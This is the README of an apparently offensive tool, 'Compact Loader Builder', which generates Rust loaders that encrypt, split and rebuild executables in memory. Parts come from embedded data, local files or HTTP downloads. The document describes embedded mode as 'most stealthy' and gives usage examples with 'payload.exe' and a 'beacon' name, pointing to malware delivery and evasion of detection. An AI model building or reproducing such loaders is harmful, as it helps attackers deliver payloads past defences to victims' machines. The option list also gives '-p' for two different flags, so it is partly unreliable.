# Compact Loader Builder

Automated tool for generating standalone loaders with different distribution methods.

## Overview

The `create_loader.py` script automates the creation of Rust-based loaders that can split, encrypt, and reconstruct binaries in memory. It generates complete Rust projects, manages the Cargo workspace, and compiles the final executables.

## Modes

### Embedded Loader
Creates a loader with all parts embedded directly in the binary. Most stealthy but results in larger binaries.

```bash
python scripts/create_loader.py embedded payload.exe --pieces 4 --password "secret"
```

### HTTP Loader
Creates a loader that downloads parts from HTTP URLs. Ideal for remote distribution.

```bash
python scripts/create_loader.py http payload.exe \
  --urls "https://server.com/part{n}" \
  --pieces 3 \
  --password "secret"
```

### Local Loader
Creates a loader that reads parts from the local filesystem. Parts must be in the same directory as the loader.

```bash
python scripts/create_loader.py local payload.exe --pieces 4 --password "secret"
```

## Usage

```bash
# Basic usage (embedded mode by default)
python scripts/create_loader.py executable.exe

# With custom options
python scripts/create_loader.py embedded executable.exe \
  --pieces 5 \
  --password "MyPassword" \
  --name "beacon" \
  --output-dir "parts"

# HTTP loader with multiple URLs
python scripts/create_loader.py http executable.exe \
  --urls "http://server.com/part000,http://server.com/part001" \
  --pieces 2 \
  --password "secret"
```

## Options

- `--password, -p`: Encryption password (default: "ChangeMe")
- `--pieces, -p`: Number of parts to split (default: 4)
- `--name, -n`: Name prefix for parts (default: "compact")
- `--output-dir, -o`: Output directory for parts (default: "tmp")
- `--urls`: Base URL(s) for HTTP mode (required for http mode)
- `--timeout`: HTTP timeout in seconds (default: 30, http mode only)
- `--user-agent`: User-Agent string (http mode only)

## Output

Generated loaders are compiled to:
- `target/release/embedded_loader.exe`
- `target/release/http_loader.exe`
- `target/release/local_loader.exe`

The script automatically:
1. Splits the binary into encrypted parts
2. Generates Rust code for the loader
3. Creates the crate structure
4. Updates the Cargo workspace
5. Compiles the loader
6. Cleans up unused loaders from the workspace

## Workflow

1. **Split**: Uses the `splitter` tool to divide the executable into encrypted parts
2. **Generate**: Creates a complete Rust project with loader code
3. **Build**: Compiles the loader in release mode
4. **Cleanup**: Removes unused loaders from the workspace

The generated loaders are standalone executables that can be distributed independently.

